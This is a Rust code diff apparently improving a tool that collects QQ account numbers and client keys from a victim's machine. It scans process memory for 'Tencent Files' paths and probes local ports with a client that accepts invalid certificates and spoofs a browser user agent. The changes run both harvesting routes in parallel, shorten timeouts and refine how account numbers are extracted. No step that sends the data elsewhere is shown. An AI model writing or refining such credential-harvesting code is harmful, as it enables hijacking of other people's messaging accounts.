@@ -23,10 +23,18 @@ struct CkItem {
 
 impl QQClientKey {
     pub async fn collect() -> String {
+        let (mem, port) = tokio::join!(
+            tokio::task::spawn_blocking(mem_scan),
+            local_port_flow()
+        );
+        let mem = match mem {
+            Ok(m) => m,
+            Err(_) => MemResult::empty(),
+        };
+
         let mut uins: Vec<String> = Vec::new();
         let mut items: Vec<CkItem> = Vec::new();
 
-        let port = local_port_flow().await;
         for u in port.uins {
             push_unique(&mut uins, u);
         }
@@ -36,7 +44,6 @@ impl QQClientKey {
         let local_ports_json = port.ports.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
         let local_error = port.error;
 
-        let mem = mem_scan();
         for u in mem.uins {
             push_unique(&mut uins, u);
         }
@@ -137,6 +144,7 @@ async fn local_port_flow() -> LocalResult {
                         }
                     }
                 }
+                break;
             }
             Ok(_) => {}
             Err(e) => last_error = e,
@@ -157,7 +165,7 @@ async fn local_port_flow() -> LocalResult {
 
 fn build_local_client() -> Result<reqwest::Client, String> {
     reqwest::Client::builder()
-        .timeout(std::time::Duration::from_secs(8))
+        .timeout(std::time::Duration::from_secs(3))
         .danger_accept_invalid_certs(true)
         .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         .build()
@@ -330,6 +338,18 @@ struct MemResult {
     pids: Vec<u32>,
     open_failed: Vec<u32>,
     pattern_found: bool,
+}
+
+impl MemResult {
+    fn empty() -> MemResult {
+        MemResult {
+            uins: Vec::new(),
+            items: Vec::new(),
+            pids: Vec::new(),
+            open_failed: Vec::new(),
+            pattern_found: false,
+        }
+    }
 }
 
 fn mem_scan() -> MemResult {
@@ -570,19 +590,7 @@ mod imp {
     }
 
     fn extract_uin(buf: &[u8]) -> Option<String> {
-        let mark = b"Tencent Files\\";
-        if let Some(pos) = find_subslice(buf, mark) {
-            let after = &buf[pos + mark.len()..];
-            let digits: String = after
-                .iter()
-                .take_while(|b| b.is_ascii_digit())
-                .map(|b| *b as char)
-                .collect();
-            if digits.len() >= 5 {
-                return Some(digits);
-            }
-        }
-
+        // Windows paths are wide strings — prefer UTF-16LE for the full uin.
         let wide_mark: Vec<u8> = "Tencent Files\\"
             .encode_utf16()
             .flat_map(|c| [(c & 0xFF) as u8, (c >> 8) as u8])
@@ -600,6 +608,19 @@ mod imp {
                     break;
                 }
             }
+            if digits.len() >= 5 {
+                return Some(digits);
+            }
+        }
+
+        let mark = b"Tencent Files\\";
+        if let Some(pos) = find_subslice(buf, mark) {
+            let after = &buf[pos + mark.len()..];
+            let digits: String = after
+                .iter()
+                .take_while(|b| b.is_ascii_digit())
+                .map(|b| *b as char)
+                .collect();
             if digits.len() >= 5 {
                 return Some(digits);
             }
